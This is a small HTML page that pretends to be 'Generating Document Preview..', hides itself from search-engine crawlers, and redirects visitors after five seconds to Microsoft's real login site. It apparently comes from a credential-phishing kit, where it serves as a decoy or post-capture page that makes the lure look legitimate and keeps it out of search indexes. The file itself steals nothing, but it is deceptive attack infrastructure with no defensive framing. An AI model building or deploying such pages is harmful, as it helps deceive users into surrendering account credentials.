<!DOCTYPE html>
<html>
<head>
	<title>Loading...</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />

<link rel="shortcut icon" href="image/ico6sd.ico" type="image/ico" />
<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://login.microsoftonline.com">
	
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" href="css/loadaf9.css">

</head>
<body>
<div class="files">
	<div class="loader"></div>
	<h4 class="loading">Generating Document Preview..</h4>
</div>
</body>
</html>